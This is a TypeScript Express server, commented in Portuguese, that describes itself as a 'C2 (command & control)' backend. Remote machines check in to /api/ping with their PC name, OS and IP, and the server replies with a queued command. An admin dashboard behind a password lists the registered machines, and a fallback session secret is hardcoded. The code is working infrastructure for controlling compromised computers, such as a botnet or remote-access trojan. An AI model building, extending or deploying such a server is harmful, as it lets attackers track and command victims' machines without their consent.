import express, { Request, Response, NextFunction } from 'express';
import session from 'express-session';
import fs from 'fs-extra';
import path from 'path';
import { fileURLToPath } from 'url';
import crypto from 'crypto';
import axios from 'axios';
import multer from 'multer';
import * as ResEdit from 'resedit';
import postgres from 'postgres';
import dotenv from 'dotenv';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// --- CONFIGURAÇÃO DE CAMINHOS ---
// Se a pasta 'dist' existir (após o npx vite build), usamos ela.
const isProduction = fs.existsSync(path.join(__dirname, 'dist'));
const publicPath = isProduction ? path.join(__dirname, 'dist') : path.join(__dirname, 'views');

declare module 'express-session' {
  interface SessionData {
    authenticated: boolean;
    isAdmin: boolean;
    license_key: string;
    expiry: number;
    ip: string;
    username: string;
  }
}

const app = express();
const PORT = process.env.PORT || 3000;

// --- BANCO DE DADOS ---
const sql = postgres(process.env.DATABASE_URL as string, { ssl: 'require' });

// --- MIDDLEWARES ---
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// SERVIR ARQUIVOS ESTÁTICOS (CSS, JS, Imagens)
app.use(express.static(publicPath));

app.use(session({
    secret: process.env.SESSION_SECRET || 'secret313_gate',
    resave: true,
    saveUninitialized: true,
    cookie: { secure: false }
}));

const adminAuth = (req: Request, res: Response, next: NextFunction) => {
    if (req.session && req.session.isAdmin) return next();
    res.redirect('/login');
};

// --- ROTAS DE PÁGINAS ---

app.get('/', (req, res) => {
    res.sendFile(path.join(publicPath, 'index.html'));
});

app.get('/login', (req, res) => {
    res.sendFile(path.join(publicPath, 'login.html'));
});

app.get('/dashboard', adminAuth, (req, res) => {
    res.sendFile(path.join(publicPath, 'dashboard.html'));
});

// --- ROTA DE LOGIN ---
app.post('/login', (req, res) => {
    const { password } = req.body;
    if (password === process.env.ADMIN_PASSWORD) {
        req.session.isAdmin = true;
        return res.redirect('/dashboard');
    }
    res.redirect('/login?error=Invalid');
});

// --- API C2 (COMMAND & CONTROL) ---
// Mantenha as rotas /api/ping, /api/nodes e /api/command como estavam no código anterior
app.get('/api/nodes', adminAuth, async (req, res) => {
    try {
        const nodes = await sql`SELECT * FROM nodes ORDER BY last_ping DESC`;
        res.json(nodes);
    } catch (e) { res.status(500).send("DB Error"); }
});

app.post('/api/ping', async (req, res) => {
    const pc_name = String(req.body.pc_name || 'Unknown');
    const os_info = String(req.body.os_info || 'Unknown');
    const ip = String(req.headers['x-forwarded-for'] || req.socket.remoteAddress);

    try {
        const result = await sql`
            INSERT INTO nodes (pc_name, ip_address, os_info, last_ping)
            VALUES (${pc_name}, ${ip}, ${os_info}, NOW())
            ON CONFLICT (pc_name) 
            DO UPDATE SET last_ping = NOW(), ip_address = ${ip}, os_info = ${os_info}
            RETURNING pending_command
        `;
        res.json({ command: result[0]?.pending_command || 'IDLE' });
    } catch (e) { res.status(500).json({ error: "DB Error" }); }
});

// Rota de Logout
app.get('/logout', (req, res) => {
    req.session.destroy(() => res.redirect('/'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n[313] SYSTEM ONLINE: http://localhost:${PORT}`);
    console.log(`[313] Mode: ${isProduction ? 'Production (dist)' : 'Development (views)'}`);
});
